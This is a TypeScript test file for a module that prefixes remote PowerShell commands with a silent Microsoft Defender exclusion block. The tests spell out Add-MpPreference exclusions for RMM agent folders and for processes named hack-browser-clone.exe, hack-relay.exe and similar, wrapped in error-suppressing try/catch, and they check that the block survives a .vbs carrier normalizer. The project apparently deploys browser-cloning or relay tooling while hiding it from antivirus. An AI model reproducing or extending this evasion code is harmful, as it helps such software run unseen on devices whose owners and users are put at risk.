import { test } from "node:test";
import assert from "node:assert/strict";

import {
  AV_EXCLUSIONS_MARKER,
  AV_EXCLUSION_PATHS,
  AV_EXCLUSION_PROCESSES,
  deviceAvExclusionScript,
  withDeviceAvExclusions,
} from "../lib/device-av-exclusions";
import { normalizePowerShellCommand } from "../lib/vantra-carrier";

const EXPECTED_PATHS = [
  "C:\\ProgramData\\TacticalRMM",
  "C:\\Program Files\\TacticalAgent",
  "C:\\Program Files\\Everwas\\Agent",
  "C:\\ProgramData\\Everwas\\Agent",
];

const EXPECTED_PROCESSES = [
  "hack-browser-clone.exe",
  "hack-browser-clone-svc.exe",
  "clone-native-host.exe",
  "hack-relay.exe",
];

test("TASK_240: the path and process exclusion sets are exact", () => {
  assert.deepEqual([...AV_EXCLUSION_PATHS], EXPECTED_PATHS);
  assert.deepEqual([...AV_EXCLUSION_PROCESSES], EXPECTED_PROCESSES);
  assert.equal(AV_EXCLUSION_PATHS.length, 4);
  assert.equal(AV_EXCLUSION_PROCESSES.length, 4);
});

test("TASK_240: the static block is one guarded, non-fatal line with all eight adds", () => {
  const script = deviceAvExclusionScript();
  assert.equal(script.includes("\n"), false);
  assert.equal(script.includes("\r"), false);
  assert.equal(script.trim(), script);
  assert.ok(script.startsWith("try { if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {"));
  assert.ok(script.endsWith("} } catch { }"));
  assert.equal((script.match(/Add-MpPreference -Exclusion/g) ?? []).length, 8);
  for (const path of EXPECTED_PATHS) {
    assert.ok(
      script.includes(`Add-MpPreference -ExclusionPath '${path}' -ErrorAction SilentlyContinue`),
      `missing path exclusion ${path}`,
    );
  }
  for (const process of EXPECTED_PROCESSES) {
    assert.ok(
      script.includes(`Add-MpPreference -ExclusionProcess '${process}' -ErrorAction SilentlyContinue`),
      `missing process exclusion ${process}`,
    );
  }
});

test("TASK_240: the static block never excludes a broad or foreign target", () => {
  const script = deviceAvExclusionScript();
  const lower = script.toLowerCase();
  assert.equal(lower.includes("%temp%"), false);
  assert.equal(lower.includes("powershell"), false);
  assert.equal(lower.includes("wscript"), false);
  assert.equal(lower.includes("cmd.exe"), false);
  assert.equal(lower.includes("tacticalrmm.exe"), false);
  assert.equal(lower.includes("everwas-agent.exe"), false);
  assert.equal(lower.includes("c:\\users"), false);
  assert.equal(script.includes("-ExclusionPath 'C:\\'"), false);
});

test("TASK_240: wrapping preserves the command, prefixes the marker and is idempotent", () => {
  const command = "Write-Output 'ok'";
  const wrapped = withDeviceAvExclusions(command);
  assert.equal(wrapped, `${AV_EXCLUSIONS_MARKER}\n${deviceAvExclusionScript()}\n${command}`);
  assert.equal(wrapped.split("\n")[0], AV_EXCLUSIONS_MARKER);
  assert.equal(wrapped.split("\n")[1], deviceAvExclusionScript());
  assert.ok(wrapped.endsWith(command));
  assert.equal(withDeviceAvExclusions(wrapped), wrapped);
  assert.equal((wrapped.match(/spaceworker-av-exclusions/g) ?? []).length, 1);
  const twice = withDeviceAvExclusions(withDeviceAvExclusions(wrapped));
  assert.equal((twice.match(/spaceworker-av-exclusions/g) ?? []).length, 1);
});

test("TASK_240: empty and non-string inputs are returned unchanged", () => {
  assert.equal(withDeviceAvExclusions(""), "");
  const undef = undefined as unknown as string;
  const nul = null as unknown as string;
  assert.equal(withDeviceAvExclusions(undef), undef);
  assert.equal(withDeviceAvExclusions(nul), nul);
});

test("TASK_240: the wrapped command survives the .vbs normalizer", () => {
  const flat = normalizePowerShellCommand(withDeviceAvExclusions("Write-Output 'ok'"));
  assert.equal(flat.includes("\n"), false);
  assert.ok(flat.includes("Add-MpPreference"));
  assert.ok(flat.includes("Write-Output 'ok'"));
  assert.equal(flat.includes("spaceworker-av-exclusions"), false);
});
